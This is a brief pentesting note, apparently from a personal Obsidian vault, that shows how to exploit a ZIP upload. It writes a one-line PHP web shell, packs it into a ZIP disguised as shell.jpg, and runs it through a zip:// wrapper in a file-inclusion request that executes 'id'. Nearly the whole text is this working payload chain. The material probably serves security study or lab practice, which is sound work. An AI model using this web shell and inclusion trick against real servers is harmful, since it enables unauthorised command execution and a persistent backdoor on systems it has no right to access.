In the following example, ZIP files are allowed to be uploaded:

![[Pasted image 20250124133327.png]]

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```bash
zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

![[Pasted image 20250124133920.png]]

